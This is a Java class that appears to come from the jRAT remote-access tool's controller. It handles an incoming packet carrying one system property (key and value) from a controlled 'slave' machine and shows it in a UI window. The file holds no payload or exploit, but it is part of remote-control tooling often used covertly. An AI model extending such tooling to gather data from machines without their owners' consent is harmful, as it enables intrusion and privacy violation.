package se.jrat.controller.packets.incoming;

import java.io.DataInputStream;

import se.jrat.controller.Slave;
import se.jrat.controller.ui.frames.FrameSystemVariables;


public class Packet32SystemProperties extends AbstractIncomingPacket {

	public void read(Slave slave, DataInputStream dis) throws Exception {
		FrameSystemVariables frame = FrameSystemVariables.INSTANCES.get(slave);
		String key = slave.readLine();
		String value = slave.readLine();
		
		if (frame != null) {
			frame.add(key, value);
		}
	}

}
